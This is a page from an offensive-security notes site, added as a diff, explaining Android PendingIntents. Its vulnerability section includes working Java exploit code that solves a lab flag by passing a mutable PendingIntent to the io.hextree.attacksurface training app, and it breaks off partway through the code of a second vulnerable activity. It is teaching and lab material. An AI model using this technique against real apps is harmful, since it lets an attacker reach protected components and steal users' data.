@@ -1,0 +1,273 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>offsecnotes | Pending intents</title>
+  <link rel="icon" type="image/png" href="/static/favicon.png">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@exampledev/new.css@1.1.2/new.min.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/styles/github.min.css" media="(prefers-color-scheme: light)" data-theme-css="light">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/styles/github-dark.min.css" media="(prefers-color-scheme: dark)" data-theme-css="dark">
+  <link rel="stylesheet" href="/static/style.css">
+  <script>
+    // Theme: saved choice (light/dark) or, if none, the system preference.
+    // Runs before the page is drawn, so there's no flash of the wrong theme.
+    function setTheme(theme) {
+      document.documentElement.dataset.theme = theme;
+      document.querySelectorAll("link[data-theme-css]").forEach(function (link) {
+        link.media = link.dataset.themeCss === theme ? "all" : "not all";
+      });
+    }
+    function toggleTheme() {
+      var current = document.documentElement.dataset.theme ||
+        (matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light");
+      var next = current === "dark" ? "light" : "dark";
+      setTheme(next);
+      try { localStorage.setItem("theme", next); } catch (e) {}
+    }
+    try { var saved = localStorage.getItem("theme"); if (saved) setTheme(saved); } catch (e) {}
+  </script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/highlight.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/languages/go.min.js"></script>
+  <script>hljs.highlightAll();</script>
+</head>
+<body>
+  <header>
+    <div class="header-top">
+      <h1>offsecnotes</h1>
+      <button class="theme-toggle" onclick="toggleTheme()" aria-label="Toggle light/dark theme" title="Toggle theme"></button>
+    </div>
+    <nav>
+      <a href="/">Home</a> • <a href="/Android/">Android</a> • <a href="/Web/">Web</a> •
+      <a href="/Network/">Network</a> • <a href="/Linux/">Linux</a> •
+      <a href="/Windows/">Windows</a> • <a href="/Misc/">Misc</a>
+    </nav>
+  </header>
+  <h1>Pending intents</h1>
+  <span>by frankheat</span>
+  <div class="toc"><ul>
+<li><a href="#introduction" id="toc-introduction">Introduction</a></li>
+<li><a href="#mutability" id="toc-mutability">Mutability</a></li>
+<li><a href="#vulnerabilities" id="toc-vulnerabilities">Vulnerabilities</a>
+<ul>
+<li><a href="#share-a-mutable-pending" id="toc-share-a-mutable-pending">Share a mutable pending</a></li>
+<li><a href="#hijack-a-pending-intent" id="toc-hijack-a-pending-intent">Hijack a pending intent</a></li>
+</ul></li>
+</ul></div>
+  <hr>
+<blockquote>
+<p><strong>Note</strong>: this section requires a full understanding of <a href="intent%20attack%20surface.html">Intent attack surface</a>.</p>
+</blockquote>
+<h2 id="introduction">Introduction</h2>
+<p>Let’s say we have two apps:</p>
+<ul>
+<li><strong>App A</strong>:
+<ul>
+<li>This app has a special, private activity called SecondActivity.</li>
+<li>In its <code>AndroidManifest.xml</code>, this activity is marked as <code>android:exported="false"</code>. This is very important. It means no other app on the phone is allowed to start this activity directly. It’s for internal use only.</li>
+</ul></li>
+<li><strong>App B</strong>:
+<ul>
+<li>This app allows a user to create a home screen widget.</li>
+<li>The goal is for this widget, when tapped, to open the SecondActivity directly inside the app A.</li>
+</ul></li>
+</ul>
+<p><strong>The Problem</strong></p>
+<p>If App B tried to launch the diary entry screen directly, it would fail. In App B’s code:</p>
+<div class="sourceCode" id="cb1"><pre class="sourceCode java"><code class="sourceCode java"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="co">// This will fail</span></span>
+<span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a>Intent intent <span class="op">=</span> <span class="kw">new</span> <span class="fu">Intent</span><span class="op">();</span></span>
+<span id="cb1-3"><a href="#cb1-3" aria-hidden="true" tabindex="-1"></a><span class="co">// Tries to explicitly name the private component in App A</span></span>
+<span id="cb1-4"><a href="#cb1-4" aria-hidden="true" tabindex="-1"></a>intent<span class="op">.</span><span class="fu">setComponent</span><span class="op">(</span><span class="kw">new</span> <span class="fu">ComponentName</span><span class="op">(</span><span class="st">&quot;com.example.secure_diary&quot;</span><span class="op">,</span> <span class="st">&quot;com.example.secure_diary.SecondActivity&quot;</span><span class="op">));</span></span>
+<span id="cb1-5"><a href="#cb1-5" aria-hidden="true" tabindex="-1"></a><span class="cf">try</span> <span class="op">{</span></span>
+<span id="cb1-6"><a href="#cb1-6" aria-hidden="true" tabindex="-1"></a>    context<span class="op">.</span><span class="fu">startActivity</span><span class="op">(</span>intent<span class="op">);</span></span>
+<span id="cb1-7"><a href="#cb1-7" aria-hidden="true" tabindex="-1"></a><span class="op">}</span> <span class="cf">catch</span> <span class="op">(</span><span class="bu">SecurityException</span> e<span class="op">)</span> <span class="op">{</span></span>
+<span id="cb1-8"><a href="#cb1-8" aria-hidden="true" tabindex="-1"></a>    <span class="co">// Crash! Android system blocks this, saying App B does not</span></span>
+<span id="cb1-9"><a href="#cb1-9" aria-hidden="true" tabindex="-1"></a>    <span class="co">// have permission to launch a non-exported activity in App A.</span></span>
+<span id="cb1-10"><a href="#cb1-10" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
+<p>This is the Android security model working perfectly. App B shouldn’t be able to force open private parts of App A.</p>
+<p><strong>The Solution With PendingIntent</strong></p>
+<p><strong>Step 1: App A (Secure Diary) Creates the “Key”</strong></p>
+<p>App A must provide a way for App B to request a key. Let’s imagine App A has a BroadcastReceiver that listens for a “key request” from App B. When App B sends this broadcast, App A runs the following code:</p>
+<div class="sourceCode" id="cb2"><pre class="sourceCode java"><code class="sourceCode java"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="co">// 1. Create the Intent - The specific instruction.</span></span>
+<span id="cb2-2"><a href="#cb2-2" aria-hidden="true" tabindex="-1"></a><span class="co">//    This points to our own private activity.</span></span>
+<span id="cb2-3"><a href="#cb2-3" aria-hidden="true" tabindex="-1"></a>Intent intent <span class="op">=</span> <span class="kw">new</span> <span class="fu">Intent</span><span class="op">();</span></span>
+<span id="cb2-4"><a href="#cb2-4" aria-hidden="true" tabindex="-1"></a>intent<span class="op">.</span><span class="fu">setComponent</span><span class="op">(</span><span class="kw">new</span> <span class="fu">ComponentName</span><span class="op">(</span></span>
+<span id="cb2-5"><a href="#cb2-5" aria-hidden="true" tabindex="-1"></a>                <span class="fu">getPackageName</span><span class="op">(),</span></span>
+<span id="cb2-6"><a href="#cb2-6" aria-hidden="true" tabindex="-1"></a>                SecondActivity<span class="op">.</span><span class="fu">class</span><span class="op">.</span><span class="fu">getCanonicalName</span><span class="op">()</span></span>
+<span id="cb2-7"><a href="#cb2-7" aria-hidden="true" tabindex="-1"></a>        <span class="op">));</span></span>
+<span id="cb2-8"><a href="#cb2-8" aria-hidden="true" tabindex="-1"></a>intent<span class="op">.</span><span class="fu">putExtra</span><span class="op">(</span><span class="st">&quot;entry_template&quot;</span><span class="op">,</span> <span class="st">&quot;Meeting Notes&quot;</span><span class="op">);</span> <span class="co">// We can even add extras!</span></span>
+<span id="cb2-9"><a href="#cb2-9" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb2-10"><a href="#cb2-10" aria-hidden="true" tabindex="-1"></a><span class="co">// 2. Create the PendingIntent</span></span>
+<span id="cb2-11"><a href="#cb2-11" aria-hidden="true" tabindex="-1"></a><span class="co">// We wrap our private intent inside this special token.</span></span>
+<span id="cb2-12"><a href="#cb2-12" aria-hidden="true" tabindex="-1"></a>PendingIntent pendingIntent <span class="op">=</span> PendingIntent<span class="op">.</span><span class="fu">getActivity</span><span class="op">(</span></span>
+<span id="cb2-13"><a href="#cb2-13" aria-hidden="true" tabindex="-1"></a>    <span class="kw">this</span><span class="op">,</span></span>
+<span id="cb2-14"><a href="#cb2-14" aria-hidden="true" tabindex="-1"></a>    <span class="dv">101</span><span class="op">,</span> <span class="co">// A unique request code to identify this key</span></span>
+<span id="cb2-15"><a href="#cb2-15" aria-hidden="true" tabindex="-1"></a>    intent<span class="op">,</span></span>
+<span id="cb2-16"><a href="#cb2-16" aria-hidden="true" tabindex="-1"></a>    PendingIntent<span class="op">.</span><span class="fu">FLAG_IMMUTABLE</span> <span class="co">// ignore for now</span></span>
+<span id="cb2-17"><a href="#cb2-17" aria-hidden="true" tabindex="-1"></a><span class="op">);</span></span>
+<span id="cb2-18"><a href="#cb2-18" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb2-19"><a href="#cb2-19" aria-hidden="true" tabindex="-1"></a><span class="co">// 3. Give the key to App B.</span></span>
+<span id="cb2-20"><a href="#cb2-20" aria-hidden="true" tabindex="-1"></a><span class="co">// A PendingIntent is Parcelable, so it can be passed like any other object:</span></span>
+<span id="cb2-21"><a href="#cb2-21" aria-hidden="true" tabindex="-1"></a><span class="co">// As an extra in an Intent, via a bound service,</span></span>
+<span id="cb2-22"><a href="#cb2-22" aria-hidden="true" tabindex="-1"></a><span class="co">// via a system API (this is what notifications/widgets do), etc.</span></span></code></pre></div>
+<p>App A has now created a secure token. This <code>pendingIntent</code> object is a reference managed by the Android system itself. It contains the instruction to launch <code>SecondActivity</code>, but it can only be used to do that one thing.</p>
+<p><strong>Step 2: App B (Shortcut Maker) Uses the “Key”</strong></p>
+<p>App B receives this <code>pendingIntent</code> object from App A. Now, App B can attach this token to its widget. When the user taps the widget, App B simply tells the system: “Use this key.”</p>
+<div class="sourceCode" id="cb3"><pre class="sourceCode java"><code class="sourceCode java"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="co">// Assume &#39;theKeyFromAppA&#39; is the PendingIntent object we received.</span></span>
+<span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb3-3"><a href="#cb3-3" aria-hidden="true" tabindex="-1"></a><span class="co">// We don&#39;t say &quot;startActivity&quot;, we just say &quot;send the request&quot;.</span></span>
+<span id="cb3-4"><a href="#cb3-4" aria-hidden="true" tabindex="-1"></a>theKeyFromAppA<span class="op">.</span><span class="fu">send</span><span class="op">();</span></span></code></pre></div>
+<p><strong>What happens when .send() is called?</strong></p>
+<ol type="1">
+<li>App B calls <code>.send()</code> on the PendingIntent token.</li>
+<li>The Android System intercepts this call.</li>
+<li>The System inspects the token and sees, “Ah, this token was created by App A.”</li>
+<li>The System unwraps the token and finds the original Intent inside (“Launch SecondActivity”).</li>
+<li>The System now executes that Intent with the identity and permissions of App A.</li>
+<li>Since App A is perfectly allowed to launch its own non-exported activity, the launch succeeds</li>
+</ol>
+<hr />
+<h2 id="mutability">Mutability</h2>
+<p>Mutability refers to whether the contents of a <code>PendingIntent</code> can be modified after it has been created.</p>
+<p>Apps targeting Android 12 (API level 31) or higher must explicitly declare whether a <code>PendingIntent</code> is mutable or immutable [<a href="https://developer.android.com/guide/components/intents-filters#DeclareMutabilityPendingIntent">↗</a>] by setting one of these flags:</p>
+<ul>
+<li><code>PendingIntent.FLAG_IMMUTABLE</code></li>
+<li><code>PendingIntent.FLAG_MUTABLE</code></li>
+</ul>
+<blockquote>
+<p><strong>Note</strong>: apps targeting older versions don’t have to set either flag, and a <code>PendingIntent</code> without <code>FLAG_IMMUTABLE</code> is mutable by default.</p>
+</blockquote>
+<hr />
+<h2 id="vulnerabilities">Vulnerabilities</h2>
+<h3 id="share-a-mutable-pending">Share a mutable pending</h3>
+<p>Let’s say that the app <code>io.hextree.attacksurface</code> has the following activity:</p>
+<div class="sourceCode" id="cb4"><pre class="sourceCode xml"><code class="sourceCode xml"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a>&lt;<span class="kw">activity</span></span>
+<span id="cb4-2"><a href="#cb4-2" aria-hidden="true" tabindex="-1"></a><span class="ot">    android:name=</span><span class="st">&quot;io.hextree.attacksurface.activities.Flag22Activity&quot;</span></span>
+<span id="cb4-3"><a href="#cb4-3" aria-hidden="true" tabindex="-1"></a><span class="ot">    android:exported=</span><span class="st">&quot;true&quot;</span>/&gt;</span></code></pre></div>
+<div class="sourceCode" id="cb5"><pre class="sourceCode java"><code class="sourceCode java"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="kw">public</span> <span class="kw">class</span> Flag22Activity <span class="kw">extends</span> AppCompactActivity <span class="op">{</span></span>
+<span id="cb5-2"><a href="#cb5-2" aria-hidden="true" tabindex="-1"></a>    <span class="kw">public</span> <span class="fu">Flag22Activity</span><span class="op">()</span> <span class="op">{</span><span class="kw">...</span><span class="op">}</span></span>
+<span id="cb5-3"><a href="#cb5-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb5-4"><a href="#cb5-4" aria-hidden="true" tabindex="-1"></a>    <span class="at">@Override</span></span>
+<span id="cb5-5"><a href="#cb5-5" aria-hidden="true" tabindex="-1"></a>    <span class="kw">protected</span> <span class="dt">void</span> <span class="fu">onCreate</span><span class="op">(</span>Bundle bundle<span class="op">)</span> <span class="kw">throws</span> PendingIntent<span class="op">.</span><span class="fu">CanceledException</span> <span class="op">{</span></span>
+<span id="cb5-6"><a href="#cb5-6" aria-hidden="true" tabindex="-1"></a>        <span class="kw">super</span><span class="op">.</span><span class="fu">onCreate</span><span class="op">(</span>bundle<span class="op">);</span></span>
+<span id="cb5-7"><a href="#cb5-7" aria-hidden="true" tabindex="-1"></a>        <span class="kw">this</span><span class="op">.</span><span class="fu">f182f</span> <span class="op">=</span> <span class="kw">new</span> <span class="fu">LogHelper</span><span class="op">(</span><span class="kw">this</span><span class="op">);</span></span>
+<span id="cb5-8"><a href="#cb5-8" aria-hidden="true" tabindex="-1"></a>        PendingIntent pendingIntent <span class="op">=</span> <span class="op">(</span>PendingIntent<span class="op">)</span> <span class="fu">getIntent</span><span class="op">().</span><span class="fu">getParcelableExtra</span><span class="op">(</span><span class="st">&quot;PENDING&quot;</span><span class="op">);</span></span>
+<span id="cb5-9"><a href="#cb5-9" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> <span class="op">(</span>pendingIntent <span class="op">!=</span> <span class="kw">null</span><span class="op">)</span> <span class="op">{</span></span>
+<span id="cb5-10"><a href="#cb5-10" aria-hidden="true" tabindex="-1"></a>            <span class="cf">try</span> <span class="op">{</span></span>
+<span id="cb5-11"><a href="#cb5-11" aria-hidden="true" tabindex="-1"></a>                Intent intent <span class="op">=</span> <span class="kw">new</span> <span class="fu">Intent</span><span class="op">();</span></span>
+<span id="cb5-12"><a href="#cb5-12" aria-hidden="true" tabindex="-1"></a>                intent<span class="op">.</span><span class="fu">getExtras</span><span class="op">();</span></span>
+<span id="cb5-13"><a href="#cb5-13" aria-hidden="true" tabindex="-1"></a>                intent<span class="op">.</span><span class="fu">putExtra</span><span class="op">(</span><span class="st">&quot;success&quot;</span><span class="op">,</span> <span class="kw">true</span><span class="op">);</span></span>
+<span id="cb5-14"><a href="#cb5-14" aria-hidden="true" tabindex="-1"></a>                intent<span class="op">.</span><span class="fu">putExtra</span><span class="op">(</span><span class="st">&quot;flag&quot;</span><span class="op">,</span> <span class="kw">this</span><span class="op">.</span><span class="fu">f182f</span><span class="op">.</span><span class="fu">appendLog</span><span class="op">(</span><span class="kw">this</span><span class="op">.</span><span class="fu">flag</span><span class="op">));</span></span>
+<span id="cb5-15"><a href="#cb5-15" aria-hidden="true" tabindex="-1"></a>                pendingIntent<span class="op">.</span><span class="fu">send</span><span class="op">(</span><span class="kw">this</span><span class="op">,</span> <span class="dv">0</span><span class="op">,</span> intent<span class="op">);</span></span>
+<span id="cb5-16"><a href="#cb5-16" aria-hidden="true" tabindex="-1"></a>                <span class="fu">success</span><span class="op">(</span><span class="kw">null</span><span class="op">,</span> <span class="kw">this</span><span class="op">);</span></span>
+<span id="cb5-17"><a href="#cb5-17" aria-hidden="true" tabindex="-1"></a>            <span class="op">}</span> <span class="cf">catch</span> <span class="op">(</span><span class="bu">Exception</span> e<span class="op">)</span> <span class="op">{</span><span class="kw">...</span><span class="op">}</span></span>
+<span id="cb5-18"><a href="#cb5-18" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span></span>
+<span id="cb5-19"><a href="#cb5-19" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
+<span id="cb5-20"><a href="#cb5-20" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
+<p>Basically, it retrieves the <code>PendingIntent</code>, construct a new <code>Intent</code> and calls <code>pendingIntent.send()</code>. The key line happen when the app executes <code>pendingIntent.send()</code> because it’s triggering the operation that the <code>PendingIntent</code> rapresents. Most importantly, the third argument (<code>Intent</code>) which is merged with the original intent created when the <code>PendingIntent</code> is made.</p>
+<p>To obtain this flag, I created two activities:</p>
+<div class="sourceCode" id="cb6"><pre class="sourceCode xml"><code class="sourceCode xml"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a>&lt;<span class="kw">activity</span></span>
+<span id="cb6-2"><a href="#cb6-2" aria-hidden="true" tabindex="-1"></a><span class="ot">    android:name=</span><span class="st">&quot;.SecondActivity&quot;</span></span>
+<span id="cb6-3"><a href="#cb6-3" aria-hidden="true" tabindex="-1"></a><span class="ot">    android:exported=</span><span class="st">&quot;false&quot;</span> /&gt;</span>
+<span id="cb6-4"><a href="#cb6-4" aria-hidden="true" tabindex="-1"></a>&lt;<span class="kw">activity</span></span>
+<span id="cb6-5"><a href="#cb6-5" aria-hidden="true" tabindex="-1"></a><span class="ot">    android:name=</span><span class="st">&quot;.MainActivity&quot;</span></span>
+<span id="cb6-6"><a href="#cb6-6" aria-hidden="true" tabindex="-1"></a><span class="ot">    android:exported=</span><span class="st">&quot;true&quot;</span>&gt;</span>
+<span id="cb6-7"><a href="#cb6-7" aria-hidden="true" tabindex="-1"></a>    &lt;<span class="kw">intent-filter</span>&gt;</span>
+<span id="cb6-8"><a href="#cb6-8" aria-hidden="true" tabindex="-1"></a>        &lt;<span class="kw">action</span><span class="ot"> android:name=</span><span class="st">&quot;android.intent.action.MAIN&quot;</span> /&gt;</span>
+<span id="cb6-9"><a href="#cb6-9" aria-hidden="true" tabindex="-1"></a>        &lt;<span class="kw">category</span><span class="ot"> android:name=</span><span class="st">&quot;android.intent.category.LAUNCHER&quot;</span> /&gt;</span>
+<span id="cb6-10"><a href="#cb6-10" aria-hidden="true" tabindex="-1"></a>    &lt;/<span class="kw">intent-filter</span>&gt;</span>
+<span id="cb6-11"><a href="#cb6-11" aria-hidden="true" tabindex="-1"></a>&lt;/<span class="kw">activity</span>&gt;</span></code></pre></div>
+<p>In the <code>MainActivity</code>, we need to a <code>PendingIntent</code> that targets my own <code>SecondActivity</code>. One of the crucial point is to add the flag <code>PendingIntent.FLAG_MUTABLE</code> since the target app needs to be able to modify the <code>Intent</code>’s extras.</p>
+<div class="sourceCode" id="cb7"><pre class="sourceCode java"><code class="sourceCode java"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a>Intent targetIntent <span class="op">=</span> <span class="kw">new</span> <span class="fu">Intent</span><span class="op">();</span></span>
+<span id="cb7-2"><a href="#cb7-2" aria-hidden="true" tabindex="-1"></a>targetIntent<span class="op">.</span><span class="fu">setComponent</span><span class="op">(</span><span class="kw">new</span> <span class="fu">ComponentName</span><span class="op">(</span></span>
+<span id="cb7-3"><a href="#cb7-3" aria-hidden="true" tabindex="-1"></a>        <span class="fu">getPackageName</span><span class="op">(),</span></span>
+<span id="cb7-4"><a href="#cb7-4" aria-hidden="true" tabindex="-1"></a>        SecondActivity<span class="op">.</span><span class="fu">class</span><span class="op">.</span><span class="fu">getCanonicalName</span><span class="op">()</span></span>
+<span id="cb7-5"><a href="#cb7-5" aria-hidden="true" tabindex="-1"></a><span class="op">));</span></span>
+<span id="cb7-6"><a href="#cb7-6" aria-hidden="true" tabindex="-1"></a>PendingIntent pendingIntent <span class="op">=</span> PendingIntent<span class="op">.</span><span class="fu">getActivity</span><span class="op">(</span><span class="kw">this</span><span class="op">,</span> <span class="dv">0</span><span class="op">,</span> targetIntent<span class="op">,</span> PendingIntent<span class="op">.</span><span class="fu">FLAG_MUTABLE</span><span class="op">);</span></span>
+<span id="cb7-7"><a href="#cb7-7" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb7-8"><a href="#cb7-8" aria-hidden="true" tabindex="-1"></a>Intent intent <span class="op">=</span> <span class="kw">new</span> <span class="fu">Intent</span><span class="op">();</span></span>
+<span id="cb7-9"><a href="#cb7-9" aria-hidden="true" tabindex="-1"></a>intent<span class="op">.</span><span class="fu">setComponent</span><span class="op">(</span><span class="kw">new</span> <span class="fu">ComponentName</span><span class="op">(</span></span>
+<span id="cb7-10"><a href="#cb7-10" aria-hidden="true" tabindex="-1"></a>        <span class="st">&quot;io.hextree.attacksurface&quot;</span><span class="op">,</span></span>
+<span id="cb7-11"><a href="#cb7-11" aria-hidden="true" tabindex="-1"></a>        <span class="st">&quot;io.hextree.attacksurface.activities.Flag22Activity&quot;</span></span>
+<span id="cb7-12"><a href="#cb7-12" aria-hidden="true" tabindex="-1"></a><span class="op">));</span></span>
+<span id="cb7-13"><a href="#cb7-13" aria-hidden="true" tabindex="-1"></a>intent<span class="op">.</span><span class="fu">putExtra</span><span class="op">(</span><span class="st">&quot;PENDING&quot;</span><span class="op">,</span> pendingIntent<span class="op">);</span></span>
+<span id="cb7-14"><a href="#cb7-14" aria-hidden="true" tabindex="-1"></a><span class="fu">startActivity</span><span class="op">(</span>intent<span class="op">);</span></span></code></pre></div>
+<p><code>SecondActivity</code> code:</p>
+<div class="sourceCode" id="cb8"><pre class="sourceCode java"><code class="sourceCode java"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a>Intent intent <span class="op">=</span> <span class="fu">getIntent</span><span class="op">();</span></span>
+<span id="cb8-2"><a href="#cb8-2" aria-hidden="true" tabindex="-1"></a><span class="bu">String</span> flag <span class="op">=</span> intent<span class="op">.</span><span class="fu">getStringExtra</span><span class="op">(</span><span class="st">&quot;flag&quot;</span><span class="op">);</span></span>
+<span id="cb8-3"><a href="#cb8-3" aria-hidden="true" tabindex="-1"></a>Log<span class="op">.</span><span class="fu">d</span><span class="op">(</span><span class="st">&quot;Flag&quot;</span><span class="op">,</span> <span class="bu">String</span><span class="op">.</span><span class="fu">valueOf</span><span class="op">(</span>flag<span class="op">));</span></span></code></pre></div>
+<h3 id="hijack-a-pending-intent">Hijack a pending intent</h3>
+<p>Let’s say that the app <code>io.hextree.attacksurface</code> has the following activity:</p>
+<div class="sourceCode" id="cb9"><pre class="sourceCode xml"><code class="sourceCode xml"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a>&lt;<span class="kw">activity</span></span>
+<span id="cb9-2"><a href="#cb9-2" aria-hidden="true" tabindex="-1"></a><span class="ot">    android:name=</span><span class="st">&quot;io.hextree.attacksurface.activities.Flag23Activity&quot;</span></span>
+<span id="cb9-3"><a href="#cb9-3" aria-hidden="true" tabindex="-1"></a><span class="ot">    android:exported=</span><span class="st">&quot;false&quot;</span>&gt;</span>
+<span id="cb9-4"><a href="#cb9-4" aria-hidden="true" tabindex="-1"></a>    &lt;<span class="kw">intent-filter</span>&gt;</span>
+<span id="cb9-5"><a href="#cb9-5" aria-hidden="true" tabindex="-1"></a>        &lt;<span class="kw">action</span><span class="ot"> android:name=</span><span class="st">&quot;io.hextree.attacksurface.MUTATE_ME&quot;</span>/&gt;</span>
+<span id="cb9-6"><a href="#cb9-6" aria-hidden="true" tabindex="-1"></a>        &lt;<span class="kw">category</span><span class="ot"> android:name=</span><span class="st">&quot;android.intent.category.DEFAULT&quot;</span>/&gt;</span>
+<span id="cb9-7"><a href="#cb9-7" aria-hidden="true" tabindex="-1"></a>    &lt;/<span class="kw">intent-filter</span>&gt;</span>
+<span id="cb9-8"><a href="#cb9-8" aria-hidden="true" tabindex="-1"></a>&lt;/<span class="kw">activity</span>&gt;</span></code></pre></div>
+<div class="sourceCode" id="cb10"><pre class="sourceCode java"><code class="sourceCode java"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a><span class="kw">public</span> <span class="kw">class</span> Flag23Activity <span class="kw">extends</span> AppCompactActivity <span class="op">{</span></span>
+<span id="cb10-2"><a href="#cb10-2" aria-hidden="true" tabindex="-1"></a>    <span class="kw">public</span> <span class="fu">Flag23Activity</span><span class="op">()</span> <span class="op">{</span><span class="kw">...</span><span class="op">}</span></span>
+<span id="cb10-3"><a href="#cb10-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb10-4"><a href="#cb10-4" aria-hidden="true" tabindex="-1"></a>    <span class="at">@Override</span></span>
+<span id="cb10-5"><a href="#cb10-5" aria-hidden="true" tabindex="-1"></a>    <span class="kw">protected</span> <span class="dt">void</span> <span class="fu">onCreate</span><span class="op">(</span>Bundle bundle<span class="op">)</span> <span class="op">{</span></span>
+<span id="cb10-6"><a href="#cb10-6" aria-hidden="true" tabindex="-1"></a>        <span class="kw">super</span><span class="op">.</span><span class="fu">onCreate</span><span class="op">(</span>bundle<span class="op">);</span></span>
+<span id="cb10-7"><a href="#cb10-7" aria-hidden="true" tabindex="-1"></a>        Intent intent <span class="op">=</span> <span class="fu">getIntent</span><span class="op">();</span></span>
+<span id="cb10-8"><a href="#cb10-8" aria-hidden="true" tabindex="-1"></a>        <span class="bu">String</span> action <span class="op">=</span> intent<span class="op">.</span><span class="fu">getAction</span><span class="op">();</span></span>
+<span id="cb10-9"><a href="#cb10-9" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> <span class="op">(</span>action <span class="op">==</span> <span class="kw">null</span><span class="op">)</span> <span class="op">{</span></span>
+<span id="cb10-10"><a href="#cb10-10" aria-hidden="true" tabindex="-1"></a>            Toast<span class="op">.</span><span class="fu">makeText</span><span class="op">(</span><span class="kw">this</span><span class="op">,</span> <span class="st">&quot;Sending implicit intent with the flag</span><span class="sc">\n</span><span class="st">io.hextree.attacksurface.MUTATE_ME&quot;</span><span class="op">,</span> <span class="dv">1</span><span class="op">).</span><span class="fu">show</span><span class="op">();</span></span>
+<span id="cb10-11"><a href="#cb10-11" aria-hidden="true" tabindex="-1"></a>            Intent intent2 <span class="op">=</span> <span class="kw">new</span> <span class="fu">Intent</span><span class="op">(</span><span class="st">&quot;io.hextree.attacksurface.GIVE_FLAG&quot;</span><span class="op">);</span></span>
+<span id="cb10-12"><a href="#cb10-12" aria-hidden="true" tabindex="-1"></a>            intent2<span class="op">.</span><span class="fu">setClassName</span><span class="op">(</span><span class="fu">getPackageName</span><span class="op">(),</span> Flag23Activity<span class="op">.</span><span class="fu">class</span><span class="op">.</span><span class="fu">getCanonicalName</span><span class="op">());</span></span>
+<span id="cb10-13"><a href="#cb10-13" aria-hidden="true" tabindex="-1"></a>            PendingIntent activity <span class="op">=</span> PendingIntent<span class="op">.</span><span class="fu">getActivity</span><span class="op">(</span><span class="fu">getApplicationContext</span><span class="op">(),</span> <span class="dv">0</span><span class="op">,</span> intent2<span class="op">,</span> <span class="dv">33554432</span><span class="op">);</span></span>
+<span id="cb10-14"><a href="#cb10-14" aria-hidden="true" tabindex="-1"></a>            Intent intent3 <span class="op">=</span> <span class="kw">new</span> <span class="fu">Intent</span><span class="op">(</span><span class="st">&quot;io.hextree.attacksurface.MUTATE_ME&quot;</span><span class="op">);</span></span>
+<span id="cb10-15"><a href="#cb10-15" aria-hidden="true" tabindex="-1"></a>            intent3<span class="op">.</span><span class="fu">addFlags</span><span class="op">(</span><span class="dv">8</span><span class="op">);</span></span>
+<span id="cb10-16"><a href="#cb10-16" aria-hidden="true" tabindex="-1"></a>            intent3<span class="op">.</span><span class="fu">putExtra</span><span class="op">(</span><span class="st">&quot;pending_intent&quot;</span><span class="op">,</span> activity<span class="op">);</span></span>
+<span id="cb10-17"><a href="#cb10-17" aria-hidden="true" tabindex="-1"></a>            <span class="fu">startActivity</span><span class="op">(</span>intent3<span class="op">);</span></span>
+<span id="cb10-18"><a href="#cb10-18" aria-hidden="true" tabindex="-1"></a>            <span class="cf">return</span><span class="op">;</span></span>
+<span id="cb10-19"><a href="#cb10-19" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span></span>
+<span id="cb10-20"><a href="#cb10-20" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> <span class="op">(</span>action<span class="op">.</span><span class="fu">equals</span><span class="op">(</span><span class="st">&quot;io.hextree.attacksurface.GIVE_FLAG&quot;</span><span class="op">))</span> <span class="op">{</span></span>
+<span id="cb10-21"><a href="#cb10-21" aria-hidden="true" tabindex="-1"></a>            <span class="cf">if</span> <span class="op">(</span>intent<span class="op">.</span><span class="fu">getIntExtra</span><span class="op">(</span><span class="st">&quot;code&quot;</span><span class="op">,</span> <span class="op">-</span><span class="dv">1</span><span class="op">)</span> <span class="op">==</span> <span class="dv">42</span><span class="op">)</span> <span class="op">{</span></span>
+<span id="cb10-22"><a href="#cb10-22" aria-hidden="true" tabindex="-1"></a>                <span class="fu">success</span><span class="op">(</span><span class="kw">this</span><span class="op">);</span></span>
+<span id="cb10-23"><a href="#cb10-23" aria-hidden="true" tabindex="-1"></a>            <span class="op">}</span> <span class="cf">else</span> <span class="op">{</span></span>
+<span id="cb10-24"><a href="#cb10-24" aria-hidden="true" tabindex="-1"></a>                Toast<span class="op">.</span><span class="fu">makeText</span><span class="op">(</span><span class="kw">this</span><span class="op">,</span> <span class="st">&quot;Condition not met for flag&quot;</span><span class="op">,</span> <span class="dv">0</span><span class="op">).</span><span class="fu">show</span><span class="op">();</span></span>
